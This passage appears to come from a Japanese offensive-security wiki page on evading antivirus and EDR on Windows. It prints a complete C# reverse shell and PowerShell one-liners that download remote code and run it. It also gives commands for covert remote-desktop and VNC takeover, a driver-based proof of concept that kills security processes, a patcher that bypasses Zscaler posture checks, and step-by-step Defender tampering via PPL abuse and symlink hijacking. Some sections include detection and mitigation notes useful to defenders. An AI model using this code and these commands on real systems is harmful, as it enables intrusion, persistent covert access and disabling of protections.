o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
これは、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/) を使用して payloads を ISO files 内にパッケージ化し、SmartScreen を bypass するデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、Windows においてアプリケーションやシステムコンポーネントが **events を log** できる強力な logging mechanism です。しかし、security products が malicious activities を監視および検出するためにも使用できます。

AMSI を disabled (bypassed) にする方法と同様に、user space process の **`EtwEventWrite`** function を、events を log せずに即座に return するようにすることも可能です。これは、memory 内の function を patch して即座に return させることで実行され、その process の ETW logging を effectively disabled にします。

詳細については **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) および [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binaries を memory 内に loading する手法はかなり以前から知られており、AV に検出されずに post-exploitation tools を実行する非常に優れた方法です。

payload は disk に触れることなく直接 memory に loaded されるため、process 全体に対する AMSI の patching だけを考慮すれば済みます。

ほとんどの C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc など) は、C# assemblies を memory 内で直接 execute する機能をすでに提供していますが、その方法にはいくつかの種類があります。

- **Fork\&Run**

**新しい sacrificial process を spawning** し、その新しい process に post-exploitation malicious code を inject して、その malicious code を execute し、完了したら新しい process を kill します。この方法には benefits と drawbacks の両方があります。fork and run method の benefit は、execution が **Beacon implant process の外部** で発生することです。つまり、post-exploitation action で何か問題が発生したり検出されたりしても、**implant が surviving する可能性がはるかに高くなります。** drawback は、**Behavioural Detections** によって検出される可能性が **高くなる** ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitation malicious code を **それ自体の process 内に** inject する方法です。これにより、新しい process を作成して AV に scan される必要を回避できますが、payload の execution で何か問題が発生した場合、crash する可能性があるため、**beacon を失う** 可能性が **はるかに高くなります。**

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading について詳しく読みたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と、InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を確認してください。

**PowerShell から** C# Assemblies を load することもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を確認してください。

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、**Attacker Controlled SMB share にインストールされた interpreter environment** への access を compromised machine に与えることで、他の languages を使用して malicious code を execute できます。

SMB share 上の Interpreter Binaries と environment への access を許可することで、compromised machine の **memory 内でこれらの languages の arbitrary code を execute** できます。

repo によると、Defender は引き続き scripts を scan しますが、Go、Java、PHP などを利用することで、**static signatures を bypass する柔軟性が高まります**。これらの languages で random な un-obfuscated reverse shell scripts を test した結果、成功しています。

## TokenStomping

Token stomping は、attacker が **access token または EDR や AV のような security product を manipulate** できる technique です。これにより、その privileges を低下させ、process が die しない一方で、malicious activities を check する permissions を持たないようにできます。

これを防ぐために、Windows は **external processes が security processes の tokens に対する handles を取得することを** 防止できます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) で説明されているように、victim の PC に Chrome Remote Desktop を deploy し、それを使用して takeover し、persistence を維持するのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ から download し、「Set up via SSH」を click してから、Windows 用の MSI file を click して MSI file を download します。
2. victim 上で installer を silently run します (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page に戻って next を click します。wizard が authorize を求めるので、Authorize button を click して続行します。
4. 指定された parameter を一部調整して execute します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI を使用せずに pin を set できる pin param に注意してください)。


## Advanced Evasion

Evasion は非常に複雑な topic です。場合によっては、1 つの system 内にある多くの異なる telemetry sources を考慮する必要があるため、成熟した environments で完全に undetected の状態を維持することはほぼ不可能です。

対抗するすべての environment には、それぞれ独自の strengths と weaknesses があります。

Advanced Evasion techniques の足がかりを得るために、[@ATTL4S](https://twitter.com/DaniLJ94) によるこの talk をぜひ視聴することを強く勧めます。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これは、[@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth についての、もう 1 つの素晴らしい talk です。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使用すると、**Defender が malicious と判定している部分を特定するまで binary の一部を **remove** し、その部分を split して提示できます。\
同じことを行う別の tool は [**avred**](https://github.com/dobin/avred) で、[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) では open web offering として service を利用できます。

### **Telnet Server**

Windows10 までは、すべての Windows に **Telnet server** が付属しており、次のコマンドを実行して (administrator として) install できました。
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システムの起動時に**起動**するようにし、今すぐ**実行**します：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet ポートを変更**（ステルス）し、firewallを無効化：
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

こちらから Download します: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（setup ではなく、bin downloads を使用します）

**ホスト上で** _**winvnc.exe**_ を実行し、server を設定します:

- _Disable TrayIcon_ オプションを有効にする
- _VNC Password_ に password を設定する
- _View-Only Password_ に password を設定する

その後、binary _**winvnc.exe**_ と**新たに**作成されたファイル _**UltraVNC.ini**_ を **victim** 内に移動します

#### **Reverse connection**

**attacker** は自身の **host 内で** binary `vncviewer.exe -listen 5900` を**実行**して、reverse **VNC connection** を受け取れる状態にします。その後、**victim** 内で次を実行します: winvnc daemon `winvnc.exe -run` を起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**WARNING:** stealth を維持するには、いくつかの操作を行わないでください

- すでに `winvnc` が実行中の場合は起動しないでください。起動すると [popup](https://i.imgur.com/1SROTTl.png) が表示されます。`tasklist | findstr winvnc` で実行中か確認します
- 同じ directory に `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。起動すると [config window](https://i.imgur.com/rfMQWcf.png) が開きます
- help を表示するために `winvnc -h` を実行しないでください。実行すると [popup](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

こちらから Download します: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT の内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
ここで `msfconsole -r file.rc` を使って **lister** を起動し、以下で **xml payload** を **execute** します：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在の Defender はプロセスを非常に速く終了させます。**

### 独自の reverse shell のコンパイル

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

以下のコマンドでコンパイルします：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
次のものと一緒に使用します:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# compilerを使用する
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### pythonを使用したinjectorのビルド例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) - Kernel Space から AV/EDR を停止する

Storm-2603 は、ransomware を展開する前に endpoint protections を無効化するため、**Antivirus Terminator** と呼ばれる小さな console utility を利用しました。この tool は**脆弱だが *signed* な独自の driver**を持ち込み、それを悪用して、Protected-Process-Light (PPL) AV services でさえブロックできない特権 kernel operations を実行します。<sup>[[12]](#references)</sup>

主なポイント
1. **Signed driver**: disk に配置される file は `ServiceMouse.sys` ですが、binary の正体は Antiy Labs の「System In-Depth Analysis Toolkit」に含まれる、正規に signed された driver `AToolsKrnl64.sys` です。この driver には有効な Microsoft signature が付いているため、Driver-Signature-Enforcement (DSE) が有効でも load されます。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
1 行目は driver を**kernel service**として登録し、2 行目はそれを start して、user land から `\\.\ServiceMouse` にアクセスできるようにします。
3. **Driver が公開する IOCTLs**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID により任意の process を terminate する（Defender/EDR services の kill に使用） |
| `0x990000D0` | disk 上の任意の file を delete する |
| `0x990001D0` | driver を unload し、service を remove する |

最小限の C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **なぜ機能するのか**: BYOVD は user-mode protections を完全に迂回します。kernel で実行される code は、PPL/PP、ELAM、その他の hardening features に関係なく、*protected* processes を open したり、terminate したり、kernel objects を tamper したりできます。

Detection / Mitigation
• Microsoft の vulnerable-driver block list（`HVCI`、`Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` を load しないようにする。
• 新しい *kernel* services の creation を monitor し、driver が world-writable directory から load された場合、または allow-list に存在しない場合に alert を出す。
• custom device objects への user-mode handles に続いて、suspicious な `DeviceIoControl` calls が発生していないか監視する。

### On-Disk Binary Patching による Zscaler Client Connector Posture Checks の Bypass

Zscaler の **Client Connector** は device-posture rules を local に適用し、結果を他の components に伝えるために Windows RPC に依存しています。2 つの弱い design choices により、完全な bypass が可能です。

1. Posture evaluation が**完全に client-side** で行われる（server には boolean が送信される）。
2. Internal RPC endpoints は、接続する executable が Zscaler によって **signed** されていること（`WinVerifyTrust` 経由）だけを validate します。<sup>[[11]](#references)</sup>

disk 上の 4 つの signed binaries を **patch** することで、両方の mechanisms を neutralise できます。

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を return し、すべての check を compliant にする |
| `ZSAService.exe` | `WinVerifyTrust` への indirect call | NOP 化され、任意の（unsigned であっても）process が RPC pipes に bind できる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置き換える |
| `ZSATunnel.exe` | tunnel の integrity checks | Short-circuit する |

最小限の patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換えて service stack を再起動した後:

* **すべての** posture checks が **green/compliant** を表示する。
* 署名されていない、または変更されたバイナリが named-pipe RPC endpoints（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開ける。
* 侵害されたホストが、Zscaler policies で定義された内部ネットワークへ無制限にアクセスできる。

この case study は、純粋に client-side で行われる trust decisions と単純な signature checks が、数バイトの patch によって回避できることを示している。

## LOLBINs を使用して Protected Process Light (PPL) を悪用し AV/EDR を改変する

Protected Process Light (PPL) は signer/level hierarchy を適用し、同等以上に保護された process だけが互いに tamper できるようにする。攻撃者の観点では、PPL-enabled binary を正規に起動し、その arguments を制御できる場合、benign な機能（例: logging）を、AV/EDR が使用する protected directories に対する、制約付きの PPL-backed write primitive に変換できる。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

PPL として process を実行するための条件
- 対象の EXE（およびロードされるすべての DLL）は、PPL-capable EKU で署名されている必要がある。
- process は、以下の flags を指定した CreateProcess によって作成する必要がある: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- バイナリの signer に対応する protection level を要求する必要がある（例: anti-malware signers には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows signers には `PROTECTION_LEVEL_WINDOWS`）。誤った level を指定すると作成に失敗する。

PP/PPL と LSASS protection の概要については、こちらも参照:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: protection level を選択し、arguments を対象の EXE に転送する CreateProcessAsPPL:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 使用パターン:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 署名済みの system binary `C:\Windows\System32\ClipUp.exe` は self-spawn し、caller が指定した path に log file を書き込むための parameter を受け付けます。
- PPL process として起動すると、file write は PPL backing によって実行されます。
- ClipUp は spaces を含む path を parse できないため、通常は保護されている location を指定するには 8.3 short paths を使用します。

8.3 short path helpers
- short names を一覧表示するには、各 parent directory で `dir /x` を実行します。
- cmd で short path を導出するには、`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA` を使用します。

Abuse chain (abstract)
1) launcher（例: CreateProcessAsPPL）を使用し、`CREATE_PROTECTED_PROCESS` とともに PPL 対応 LOLBIN（ClipUp）を起動します。
2) ClipUp の log-path argument を渡し、protected AV directory（例: Defender Platform）内に file creation を強制します。必要に応じて 8.3 short names を使用します。
3) target binary が実行中に AV によって通常 open/locked される場合（例: MsMpEng.exe）、AV が起動する前の boot 時に write が行われるよう、より早く確実に実行される auto-start service を install します。Process Monitor（boot logging）で boot ordering を検証します。
4) reboot 時に、PPL-backed write が AV による binaries の lock より前に実行され、target file が corrupt されて startup が妨げられます。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp が書き込む内容を配置場所以外で制御することはできません。この primitive は、正確な内容の注入よりも破壊に適しています。
- サービスの install/start と reboot window には、local admin/SYSTEM が必要です。
- Timing が重要です。target は open であってはなりません。boot-time execution により file locks を回避できます。

Detections
- `ClipUp.exe` の Process creation。特に、boot 前後に non-standard launchers が parent になっている、通常とは異なる arguments。
- suspicious binaries を auto-start するよう設定された新しい services、および Defender/AV より一貫して先に起動する services。Defender startup failures の前に行われた service creation/modification を調査します。
- Defender binaries/Platform directories に対する file integrity monitoring。protected-process flags を持つ processes による予期しない file creations/modifications。
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` で作成された processes、および non-AV binaries による anomalous な PPL level の使用を確認します。

Mitigations
- WDAC/Code Integrity: どの signed binaries が PPL として実行できるか、およびどの parents の下で実行できるかを制限し、legitimate contexts 以外での ClipUp invocation を block します。
- Service hygiene: auto-start services の creation/modification を制限し、start-order manipulation を monitor します。
- Defender tamper protection と early-launch protections が有効であることを確認し、binary corruption を示す startup errors を調査します。
- 環境との互換性がある場合は、security tooling をホストする volumes での 8.3 short-name generation の無効化を検討します（十分に test してください）。

## Platform Version Folder Symlink Hijack による Microsoft Defender の Tampering

Windows Defender は、次の配下にある subfolders を列挙して、実行元となる platform を選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

最も lexicographically 高い version string（例: `4.18.25070.5-0`）を持つ subfolder を選択し、そこから Defender service processes を起動します（service/registry paths もそれに応じて更新されます）。この選択では、directory reparse points（symlinks を含む）を含む directory entries が信頼されます。administrator はこれを利用して Defender を attacker-writable path に redirect し、DLL sideloading や service disruption を実現できます。<sup>[[21]](#references)[[22]](#references)</sup>

Preconditions
- Local Administrator（Platform folder 配下に directories/symlinks を作成するために必要）
- reboot、または Defender platform re-selection を trigger する能力（boot 時の service restart）
- 必要なのは built-in tools のみ（mklink）

なぜ機能するのか
- Defender は自身の folders への writes を block しますが、platform selection では directory entries が信頼され、target が protected/trusted path に resolve されるかを検証せずに、lexicographically 最も高い version が選択されます。

Step-by-step（例）
1) 現在の platform folder の writable clone を準備します。例: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、あなたのフォルダを指す、より高いバージョンのディレクトリ symlink を作成します:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger の選択（reboot 推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されることを確認する:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しいプロセスパスが `C:\TMP\AV\` 配下にあり、service configuration/registry にその場所が反映されていることを確認します。

Post-exploitation options
- DLL sideloading/code execution: Defender が application directory から読み込む DLL を配置・置換し、Defender のプロセス内でコードを実行します。上記のセクションを参照してください: [DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial: version-symlink を削除します。次回の起動時に configured path が解決できなくなり、Defender の起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Note that この technique は単独では privilege escalation を提供せず、admin rights が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams は、runtime evasion を C2 implant から target module 自体へ移すことができます。具体的には、その Import Address Table (IAT) を hooking し、選択した API を attacker-controlled な position-independent code (PIC) 経由で routing します。これにより、多くの kit が公開する小規模な API surface（例: CreateProcessA）を超えて evasion を一般化し、同じ protections を BOFs や post-exploitation DLLs にも拡張できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

High-level approach
- reflective loader（prepended または companion）を使用して、target module とともに PIC blob を stage します。PIC は self-contained で position-independent でなければなりません。
- host DLL の load 時に、その IMAGE_IMPORT_DESCRIPTOR を走査し、targeted imports（例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）の IAT entries を thin PIC wrappers を指すように patch します。
- 各 PIC wrapper は、real API address に tail-call する前に evasion を実行します。一般的な evasion には以下が含まれます:
- call の前後で Memory mask/unmask を行う（例: beacon regions を encrypt、RWX→RX、page names/permissions を変更し、call 後に restore）。
- Call-stack spoofing: benign な stack を構築し、target API へ transition することで、call-stack analysis が想定された frames に解決されるようにします。<sup>[[9]](#references)</sup>
- Compatibility のため、Aggressor script（または equivalent）が Beacon、BOFs、post-ex DLLs 用に hook する API を register できる interface を export します。

Why IAT hooking here
- hooked import を使用するあらゆる code で機能し、tool code を変更したり、特定の API を proxy するために Beacon に依存したりする必要がありません。
- post-ex DLLs を cover します。LoadLibrary* を hooking することで、module loads（例: System.Management.Automation.dll、clr.dll）を intercept し、それらの API calls に同じ masking/stack evasion を適用できます。
- CreateProcessA/W を wrapping することで、call-stack-based detections に対する process-spawning post-ex commands の reliable な使用を復元します。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR の後、import を初めて使用する前に patch を適用する。TitanLdr/AceLdr のような Reflective loader は、loaded module の DllMain 中に hooking を行う方法を示している。
- wrapper は小さく、PIC-safe に保つ。patch 前に取得した original IAT の値、または LdrGetProcedureAddress を介して true API を解決する。
- PIC では RW → RX の遷移を使用し、writable+executable のページを残さない。

Call-stack spoofing stub
- Draugr-style の PIC stub は、benign module 内の return address による fake call chain を構築し、その後 real API に pivot する。
- これにより、Beacon/BOFs から sensitive API への canonical stack を想定する detection を回避する。
- stack cutting/stack stitching techniques と組み合わせ、API prologue の前に想定される frame 内へ着地させる。

Operational integration
- reflective loader を post-ex DLL の先頭に追加し、DLL の load 時に PIC と hooks が自動的に初期化されるようにする。
- Aggressor script を使用して target API を登録し、code changes なしで Beacon と BOFs が同じ evasion path の恩恵を透過的に受けられるようにする。

Detection/DFIR considerations
- IAT integrity: non-image（heap/anon）の address に解決される entry、import pointer の定期的な検証。
- Stack anomalies: loaded image に属さない return address、non-image PIC への突然の遷移、不整合な RtlUserThreadStart ancestry。
- Loader telemetry: IAT への in-process write、import thunk を変更する early DllMain activity、load 時に作成される予期しない RX region。
- Image-load evasion: hooking LoadLibrary* を使用する場合、memory masking event と相関する automation/clr assembly の suspicious な load を監視する。

Related building blocks and examples
- load 中に IAT patching を実行する reflective loader（例: TitanLdr、AceLdr）
- Memory masking hooks（例: simplehook）および stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### resident PICO による import-time IAT hooks

reflective loader を制御できる場合、custom resolver で loader の `GetProcAddress` pointer を置き換え、最初に hooks を確認することで、`ProcessImports()` 中に imports を hook できる:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- transient loader PIC が自らを free した後も存続する **resident PICO**（persistent PIC object）を構築する。
- `setup_hooks()` function を export し、loader の import resolver を上書きする（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress` では ordinal imports を skip し、`__resolve_hook(ror13hash(name))` のような hash-based hook lookup を使用する。hook が存在する場合はそれを返し、存在しない場合は real `GetProcAddress` に delegate する。
- Crystal Palace の `addhook "MODULE$Func" "hook"` entry を使って link time に hook target を登録する。hook は resident PICO 内に存在するため、引き続き有効である。

これにより、load 後に loaded DLL の code section を patch することなく **import-time IAT redirection** が実現する。

### target が PEB-walking を使用する場合に hook 可能な imports を強制する

import-time hooks は、その function が target の IAT に実際に存在する場合にのみ trigger される。module が PEB-walk + hash（import entry なし）で APIs を解決する場合、real import を強制して loader の `ProcessImports()` path に認識させる:

- hashed export resolution（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject` のような direct reference に置き換える。
- compiler が IAT entry を生成するため、reflective loader が imports を解決する際に interception が可能になる。

### `Sleep()` を patch しない Ekko-style sleep/idle obfuscation
